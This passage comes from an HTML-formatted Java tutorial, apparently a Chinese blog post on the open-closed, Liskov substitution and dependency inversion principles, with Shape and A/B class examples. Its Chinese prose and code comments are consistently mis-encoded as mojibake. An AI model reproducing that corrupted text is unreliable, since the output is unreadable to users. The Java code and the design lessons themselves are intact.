ä¸‰è§’å½¢ï¼Œæˆ‘ä»¬éœ€è¦åšå¦‚ä¸‹ä¿®æ”¹ï¼Œä¿®æ”¹çš„åœ°æ–¹è¾ƒå¤š</p></li></ol><blockquote><p>æ”¹è¿›çš„æ€è·¯åˆ†æ</p></blockquote><p><strong>æ€è·¯</strong>ï¼šæŠŠåˆ›å»º <strong>Shape ç±»åšæˆæŠ½è±¡ç±»</strong>ï¼Œå¹¶á¨€ ä¾›ä¸€ä¸ª<strong>æŠ½è±¡çš„ draw</strong> æ–¹æ³•ï¼Œè®©<strong>å­ç±»å»å®ç°å³å¯</strong>ï¼Œè¿™æ ·æˆ‘ä»¬æœ‰æ–°çš„å›¾å½¢ç§ç±»æ—¶ï¼Œåªéœ€è¦è®©æ–°çš„å›¾å½¢ç±»ç»§æ‰¿ Shapeï¼Œå¹¶å®ç° draw æ–¹æ³•å³å¯ï¼Œ<strong>ä½¿ç”¨æ–¹çš„ä»£ç å°±ä¸éœ€è¦ä¿®</strong> -&gt; æ»¡è¶³äº†å¼€é—­åŸåˆ™</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230108203845045.png" alt="image-20230108203845045" /></p><p><code>Ocp.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.ocp.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Ocp</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">//ä½¿ç”¨çœ‹çœ‹å­˜åœ¨çš„é—®é¢˜</span><br>      <span class="hljs-type">GraphicEditor</span> <span class="hljs-variable">graphicEditor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GraphicEditor</span>();<br>      graphicEditor.drawShape(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Rectangle</span>());<br>      graphicEditor.drawShape(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Circle</span>());<br>      graphicEditor.drawShape(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Triangle</span>());<br>      graphicEditor.drawShape(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OtherGraphic</span>());<br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">//è¿™æ˜¯ä¸€ä¸ªç”¨äºç»˜å›¾çš„ç±» [ä½¿ç”¨æ–¹]</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GraphicEditor</span> &#123;<br>   <span class="hljs-comment">//æ¥æ”¶Shapeå¯¹è±¡ï¼Œè°ƒç”¨drawæ–¹æ³•</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">drawShape</span><span class="hljs-params">(Shape s)</span> &#123;<br>      s.draw();<br>   &#125;<br><br>   <br>&#125;<br><br><span class="hljs-comment">//Shapeç±»ï¼ŒåŸºç±»</span><br><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shape</span> &#123;<br>   <span class="hljs-type">int</span> m_type;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">draw</span><span class="hljs-params">()</span>;<span class="hljs-comment">//æŠ½è±¡æ–¹æ³•</span><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Rectangle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br>   Rectangle() &#123;<br>      <span class="hljs-built_in">super</span>.m_type = <span class="hljs-number">1</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">draw</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; ç»˜åˆ¶çŸ©å½¢ &quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Circle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br>   Circle() &#123;<br>      <span class="hljs-built_in">super</span>.m_type = <span class="hljs-number">2</span>;<br>   &#125;<br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">draw</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; ç»˜åˆ¶åœ†å½¢ &quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">//æ–°å¢ç”»ä¸‰è§’å½¢</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Triangle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br>   Triangle() &#123;<br>      <span class="hljs-built_in">super</span>.m_type = <span class="hljs-number">3</span>;<br>   &#125;<br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">draw</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; ç»˜åˆ¶ä¸‰è§’å½¢ &quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">//æ–°å¢ä¸€ä¸ªå›¾å½¢</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">OtherGraphic</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br>   OtherGraphic() &#123;<br>      <span class="hljs-built_in">super</span>.m_type = <span class="hljs-number">4</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">draw</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; ç»˜åˆ¶å…¶å®ƒå›¾å½¢ &quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-é‡Œæ°ä»£æ¢åŸåˆ™liskov-substitution-principle"><a class="markdownIt-Anchor" href="#2-é‡Œæ°ä»£æ¢åŸåˆ™liskov-substitution-principle"></a> <strong>2ã€é‡Œæ°ä»£æ¢åŸåˆ™ï¼ˆLiskov Substitution Principleï¼‰</strong></h2><p>é‡Œæ°ä»£æ¢åŸåˆ™æ˜¯é¢å‘å¯¹è±¡è®¾è®¡çš„åŸºæœ¬åŸåˆ™ä¹‹ä¸€ã€‚ é‡Œæ°ä»£æ¢åŸåˆ™ä¸­è¯´ï¼Œä»»ä½•åŸºç±»å¯ä»¥å‡ºç°çš„åœ°æ–¹ï¼Œå­ç±»ä¸€å®šå¯ä»¥å‡ºç°ã€‚LSPæ˜¯ç»§æ‰¿å¤ç”¨çš„åŸºçŸ³ï¼Œåªæœ‰å½“æ´¾ç”Ÿç±»å¯ä»¥æ›¿æ¢æ‰åŸºç±»ï¼Œä¸”è½¯ä»¶å•ä½çš„åŠŸèƒ½ä¸å—åˆ°å½±å“æ—¶ï¼ŒåŸºç±»æ‰èƒ½çœŸæ­£è¢«å¤ç”¨ï¼Œè€Œæ´¾ç”Ÿç±»ä¹Ÿèƒ½å¤Ÿåœ¨åŸºç±»çš„åŸºç¡€ä¸Šå¢åŠ æ–°çš„è¡Œä¸ºã€‚é‡Œæ°ä»£æ¢åŸåˆ™æ˜¯å¯¹å¼€é—­åŸåˆ™çš„è¡¥å……ã€‚å®ç°å¼€é—­åŸåˆ™çš„å…³é”®æ­¥éª¤å°±æ˜¯æŠ½è±¡åŒ–ï¼Œè€ŒåŸºç±»ä¸å­ç±»çš„ç»§æ‰¿å…³ç³»å°±æ˜¯æŠ½è±¡åŒ–çš„å…·ä½“å®ç°ï¼Œæ‰€ä»¥é‡Œæ°ä»£æ¢åŸåˆ™æ˜¯å¯¹å®ç°æŠ½è±¡åŒ–çš„å…·ä½“æ­¥éª¤çš„è§„èŒƒã€‚</p><ol><li><p>é‡Œæ°æ›¿æ¢åŸåˆ™(Liskov Substitution Principle)åœ¨ 1988 å¹´ï¼Œç”±éº»çœç†å·¥å­¦é™¢çš„ä»¥ä¸ºå§“é‡Œçš„å¥³å£«á¨€ å‡ºçš„ã€‚</p></li><li><p>å¦‚æœå¯¹æ¯ä¸ªç±»å‹ä¸º T1 çš„å¯¹è±¡ o1ï¼Œéƒ½æœ‰ç±»å‹ä¸º T2 çš„å¯¹è±¡ o2ï¼Œä½¿å¾—ä»¥ T1 å®šä¹‰çš„æ‰€æœ‰ç¨‹åº P åœ¨æ‰€æœ‰çš„å¯¹è±¡ o1 éƒ½ä»£æ¢æˆ o2 æ—¶ï¼Œç¨‹åº P çš„è¡Œä¸ºæ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œé‚£ä¹ˆç±»å‹ T2 æ˜¯ç±»å‹ T1 çš„å­ç±»å‹ã€‚<strong>æ¢å¥è¯è¯´ï¼Œæ‰€æœ‰å¼•ç”¨åŸºç±»çš„åœ°é¡»èƒ½é€æ˜åœ°ä½¿ç”¨å…¶å­ç±»çš„å¯¹è±¡</strong>ã€‚</p></li><li><p>åœ¨ä½¿ç”¨ç»§æ‰¿æ—¶ï¼Œéµå¾ªé‡Œæ°æ›¿æ¢åŸåˆ™ï¼Œåœ¨<strong>å­ç±»ä¸­å°½é‡ä¸è¦é‡å†™çˆ¶ç±»çš„æ–¹æ³•</strong></p></li><li><p>é‡Œæ°æ›¿æ¢åŸåˆ™å‘Šè¯‰æˆ‘ä»¬ï¼Œç»§æ‰¿å®é™…ä¸Šè®©ä¸¤ä¸ªç±»è€¦åˆæ€§å¢å¼ºäº†ï¼Œåœ¨é€‚å½“çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡<strong>èšåˆï¼Œç»„åˆï¼Œä¾èµ– æ¥è§£å†³é—®é¢˜</strong>ã€‚.</p></li></ol><blockquote><p>ç»§æ‰¿æ€§çš„æ€è€ƒå’Œè¯´æ˜</p></blockquote><ol><li><p>ç»§æ‰¿åŒ…å«è¿™æ ·ä¸€å±‚å«ä¹‰ï¼šçˆ¶ç±»ä¸­å‡¡æ˜¯å·²ç»å®ç°å¥½çš„æ–¹æ³•ï¼Œå®é™…ä¸Šæ˜¯åœ¨è®¾å®šè§„èŒƒå’Œå¥‘çº¦ï¼Œè™½ç„¶å®ƒä¸å¼ºåˆ¶è¦æ±‚æ‰€æœ‰çš„å­ç±»å¿…é¡»éµå¾ªè¿™äº›å¥‘çº¦ï¼Œä½†æ˜¯å¦‚æœå­ç±»å¯¹è¿™äº›å·²ç»å®ç°çš„æ–¹æ³•ä»»æ„ä¿®æ”¹ï¼Œå°±ä¼šå¯¹æ•´ä¸ªç»§æ‰¿ä½“ç³»é€ æˆç ´åã€‚</p></li><li><p><strong>ç»§æ‰¿åœ¨ç»™ç¨‹åºè®¾è®¡å¸¦æ¥ä¾¿åˆ©çš„åŒæ—¶ï¼Œä¹Ÿå¸¦æ¥äº†å¼Šç«¯</strong>ã€‚æ¯”å¦‚ä½¿ç”¨ç»§æ‰¿ä¼šç»™ç¨‹åºå¸¦æ¥<strong>ä¾µå…¥æ€§</strong>ï¼Œç¨‹åºçš„å¯ç§»æ¤æ€§é™ä½ï¼Œå¢åŠ å¯¹è±¡é—´çš„è€¦åˆæ€§ï¼Œå¦‚æœä¸€ä¸ªç±»è¢«å…¶ä»–çš„ç±»æ‰€ç»§æ‰¿ï¼Œåˆ™å½“è¿™ä¸ªç±»éœ€è¦ä¿®æ”¹æ—¶ï¼Œå¿…é¡»è€ƒè™‘åˆ°æ‰€æœ‰çš„å­ç±»ï¼Œå¹¶ä¸”çˆ¶ç±»ä¿®æ”¹åï¼Œæ‰€æœ‰æ¶‰åŠåˆ°å­ç±»çš„åŠŸèƒ½éƒ½æœ‰å¯èƒ½äº§ç”Ÿæ•…éšœ</p></li><li><p>é—®é¢˜æ å‡ºï¼š<strong>åœ¨ç¼–ç¨‹ä¸­ï¼Œå¦‚ä½•æ­£ç¡®çš„ä½¿ç”¨ç»§æ‰¿</strong>? =&gt; <strong>é‡Œæ°æ›¿æ¢</strong>åŸåˆ™</p></li></ol><h3 id="ä¸€ä¸ªç¨‹åºå¼•å‡ºçš„é—®é¢˜å’Œæ€è€ƒ"><a class="markdownIt-Anchor" href="#ä¸€ä¸ªç¨‹åºå¼•å‡ºçš„é—®é¢˜å’Œæ€è€ƒ"></a> ä¸€ä¸ªç¨‹åºå¼•å‡ºçš„é—®é¢˜å’Œæ€è€ƒ</h3><p><code>Liskov.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.liskov;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Liskov</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>      System.out.println(<span class="hljs-string">&quot;11-3=&quot;</span> + a.func1(<span class="hljs-number">11</span>, <span class="hljs-number">3</span>));<br>      System.out.println(<span class="hljs-string">&quot;1-8=&quot;</span> + a.func1(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>));<br><br>      System.out.println(<span class="hljs-string">&quot;-----------------------&quot;</span>);<br>      <span class="hljs-type">B</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>      System.out.println(<span class="hljs-string">&quot;11-3=&quot;</span> + b.func1(<span class="hljs-number">11</span>, <span class="hljs-number">3</span>));<span class="hljs-comment">//è¿™é‡Œæœ¬æ„æ˜¯æ±‚å‡º11-3</span><br>      System.out.println(<span class="hljs-string">&quot;1-8=&quot;</span> + b.func1(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>));<span class="hljs-comment">// 1-8</span><br>      System.out.println(<span class="hljs-string">&quot;11+3+9=&quot;</span> + b.func2(<span class="hljs-number">11</span>, <span class="hljs-number">3</span>));<br>      <br>      <br><br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">// Aç±»</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123;<br>   <span class="hljs-comment">// è¿”å›ä¸¤ä¸ªæ•°çš„å·®</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">func1</span><span class="hljs-params">(<span class="hljs-type">int</span> num1, <span class="hljs-type">int</span> num2)</span> &#123;<br>      <span class="hljs-keyword">return</span> num1 - num2;<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">// Bç±»ç»§æ‰¿äº†A</span><br><span class="hljs-comment">// å¢åŠ äº†ä¸€ä¸ªæ–°åŠŸèƒ½ï¼šå®Œæˆä¸¤ä¸ªæ•°ç›¸åŠ ,ç„¶åå’Œ9æ±‚å’Œ</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span> &#123;<br>   <span class="hljs-comment">//è¿™é‡Œï¼Œé‡å†™äº†Aç±»çš„æ–¹æ³•, å¯èƒ½æ˜¯æ— æ„è¯†</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">func1</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>      <span class="hljs-keyword">return</span> a + b;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">func2</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>      <span class="hljs-keyword">return</span> func1(a, b) + <span class="hljs-number">9</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è§£å†³æ–¹æ³•"><a class="markdownIt-Anchor" href="#è§£å†³æ–¹æ³•"></a> è§£å†³æ–¹æ³•</h3><ol><li><p>æˆ‘ä»¬å‘ç°åŸæ¥è¿è¡Œæ­£å¸¸çš„ç›¸å‡åŠŸèƒ½å‘ç”Ÿäº†é”™è¯¯ã€‚åŸå› å°±æ˜¯ç±» B æ— æ„ä¸­é‡å†™äº†çˆ¶ç±»çš„æ–¹æ³•ï¼Œé€ æˆåŸæœ‰åŠŸèƒ½å‡ºç°é”™è¯¯ã€‚åœ¨å®é™…ç¼–ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¸¸å¸¸ä¼šé€šè¿‡é‡å†™çˆ¶ç±»çš„æ–¹æ³•å®Œæˆæ–°çš„åŠŸèƒ½ï¼Œè¿™æ ·å†™èµ·æ¥è™½ç„¶ç®€å•ï¼Œä½†æ•´ä¸ªç»§æ‰¿ä½“ç³»çš„å¤ç”¨æ€§ä¼šæ¯”è¾ƒå·®ã€‚ç‰¹åˆ«æ˜¯è¿è¡Œå¤šæ€æ¯”è¾ƒé¢‘ç¹çš„æ—¶å€™</p></li><li><p>é€šç”¨çš„åšæ³•æ˜¯ï¼š<strong>åŸæ¥çš„çˆ¶ç±»å’Œå­ç±»éƒ½ç»§æ‰¿ä¸€ä¸ªæ›´é€šä¿—çš„åŸºç±»</strong>ï¼ŒåŸæœ‰çš„ç»§æ‰¿å…³ç³»å»æ‰ï¼Œé‡‡ç”¨<strong>ä¾èµ–ï¼Œèšåˆï¼Œç»„åˆ</strong>ç­‰å…³ç³»ä»£æ›¿.</p></li><li><p>æ”¹è¿›æ–¹æ¡ˆ</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230108202856132.png" alt="image-20230108202856132" /></p><p><code>Liskov.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.liskov.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Liskov</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>      System.out.println(<span class="hljs-string">&quot;11-3=&quot;</span> + a.func1(<span class="hljs-number">11</span>, <span class="hljs-number">3</span>));<br>      System.out.println(<span class="hljs-string">&quot;1-8=&quot;</span> + a.func1(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>));<br><br>      System.out.println(<span class="hljs-string">&quot;-----------------------&quot;</span>);<br>      <span class="hljs-type">B</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>      <span class="hljs-comment">//å› ä¸ºBç±»ä¸å†ç»§æ‰¿Aç±»ï¼Œå› æ­¤è°ƒç”¨è€…ï¼Œä¸ä¼šå†func1æ˜¯æ±‚å‡æ³•</span><br>      <span class="hljs-comment">//è°ƒç”¨å®Œæˆçš„åŠŸèƒ½å°±ä¼šå¾ˆæ˜ç¡®</span><br>      System.out.println(<span class="hljs-string">&quot;11+3=&quot;</span> + b.func1(<span class="hljs-number">11</span>, <span class="hljs-number">3</span>));<span class="hljs-comment">//è¿™é‡Œæœ¬æ„æ˜¯æ±‚å‡º11+3</span><br>      System.out.println(<span class="hljs-string">&quot;1+8=&quot;</span> + b.func1(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>));<span class="hljs-comment">// 1+8</span><br>      System.out.println(<span class="hljs-string">&quot;11+3+9=&quot;</span> + b.func2(<span class="hljs-number">11</span>, <span class="hljs-number">3</span>));<br>      <br>      <br>      <span class="hljs-comment">//ä½¿ç”¨ç»„åˆä»ç„¶å¯ä»¥ä½¿ç”¨åˆ°Aç±»ç›¸å…³æ–¹æ³•</span><br>      System.out.println(<span class="hljs-string">&quot;11-3=&quot;</span> + b.func3(<span class="hljs-number">11</span>, <span class="hljs-number">3</span>));<span class="hljs-comment">// è¿™é‡Œæœ¬æ„æ˜¯æ±‚å‡º11-3</span><br>      <br><br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªæ›´åŠ åŸºç¡€çš„åŸºç±»</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> &#123;<br>   <span class="hljs-comment">//æŠŠæ›´åŠ åŸºç¡€çš„æ–¹æ³•å’Œæˆå‘˜å†™åˆ°Baseç±»</span><br>&#125;<br><br><span class="hljs-comment">// Aç±»</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Base</span> &#123;<br>   <span class="hljs-comment">// è¿”å›ä¸¤ä¸ªæ•°çš„å·®</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">func1</span><span class="hljs-params">(<span class="hljs-type">int</span> num1, <span class="hljs-type">int</span> num2)</span> &#123;<br>      <span class="hljs-keyword">return</span> num1 - num2;<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">// Bç±»ç»§æ‰¿äº†A</span><br><span class="hljs-comment">// å¢åŠ äº†ä¸€ä¸ªæ–°åŠŸèƒ½ï¼šå®Œæˆä¸¤ä¸ªæ•°ç›¸åŠ ,ç„¶åå’Œ9æ±‚å’Œ</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Base</span> &#123;<br>   <span class="hljs-comment">//å¦‚æœBéœ€è¦ä½¿ç”¨Aç±»çš„æ–¹æ³•,ä½¿ç”¨ç»„åˆå…³ç³»</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>   <br>   <span class="hljs-comment">//è¿™é‡Œï¼Œé‡å†™äº†Aç±»çš„æ–¹æ³•, å¯èƒ½æ˜¯æ— æ„è¯†</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">func1</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>      <span class="hljs-keyword">return</span> a + b;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">func2</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>      <span class="hljs-keyword">return</span> func1(a, b) + <span class="hljs-number">9</span>;<br>   &#125;<br>   <br>   <span class="hljs-comment">//æˆ‘ä»¬ä»ç„¶æƒ³ä½¿ç”¨Açš„æ–¹æ³•</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">func3</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.a.func1(a, b);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="3-ä¾èµ–å€’è½¬åŸåˆ™dependence-inversion-principle"><a class="markdownIt-Anchor" href="#3-ä¾èµ–å€’è½¬åŸåˆ™dependence-inversion-principle"></a> <strong>3ã€ä¾èµ–å€’è½¬åŸåˆ™ï¼ˆDependence Inversion Principleï¼‰</strong></h2><ol><li><p>é«˜å±‚æ¨¡å—ä¸åº”è¯¥ä¾èµ–ä½å±‚æ¨¡å—ï¼ŒäºŒè€…éƒ½åº”è¯¥ä¾èµ–å…¶æŠ½è±¡</p></li><li><p><strong>æŠ½è±¡ä¸åº”è¯¥ä¾èµ–ç»†èŠ‚ï¼Œç»†èŠ‚åº”è¯¥ä¾èµ–æŠ½è±¡</strong></p></li><li><p>ä¾èµ–å€’è½¬(å€’ç½®)çš„ä¸­å¿ƒæ€æƒ³æ˜¯<strong>é¢å‘æ¥å£ç¼–ç¨‹</strong></p></li><li><p>ä¾èµ–å€’è½¬åŸåˆ™æ˜¯åŸºäºè¿™æ ·çš„è®¾è®¡ç†å¿µï¼šç›¸å¯¹äºç»†èŠ‚çš„å¤šå˜æ€§ï¼ŒæŠ½è±¡çš„ä¸œè¥¿è¦ç¨³å®šçš„å¤šã€‚ä»¥æŠ½è±¡ä¸ºåŸºç¡€æ­å»ºçš„æ¶æ„æ¯”ä»¥ç»†èŠ‚ä¸ºåŸºç¡€çš„æ¶æ„è¦ç¨³å®šçš„å¤šã€‚åœ¨ java 